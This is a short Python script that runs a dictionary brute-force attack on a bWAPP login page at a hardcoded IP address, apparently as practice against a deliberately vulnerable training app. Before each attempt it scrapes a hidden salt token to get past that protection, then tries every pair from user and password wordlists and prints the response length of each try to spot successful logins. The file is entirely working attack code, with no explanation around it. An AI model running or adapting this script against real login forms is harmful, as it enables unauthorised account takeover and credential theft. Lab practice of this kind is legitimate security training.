import requests
import re

url = "http://101.198.190.68/bWAPP/ba_pwd_attacks_2.php"
cookie = "PHPSESSID=gdm481o1ronok078p99mcends0; security_level=1"
header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0',
          'Cookie': cookie}

def getsalt():
    r = requests.get(url, headers=header)
    reg = '<input type="hidden" id="salt" name="salt" value="(.+)"'
    salt = re.findall(reg, r.content)[0]
    return salt

def pwdattack():
    u = open('users.txt', 'r')
    p = open('passwords.txt', 'r')
    userlist = []
    passlist = []
    for line in u.readlines():
        userlist.append(line.strip())
    for line in p.readlines():
        passlist.append(line.strip())
    u.close()
    p.close()

    for user in userlist:
        for passwd in passlist:
            data = {'login': user, 'password': passwd, 'salt': getsalt(), 'form': 'submit'}
            rs = requests.post(url, data=data, headers=header)
            print str(len(rs.text)) + ':' + user+'/'+ passwd

pwdattack()
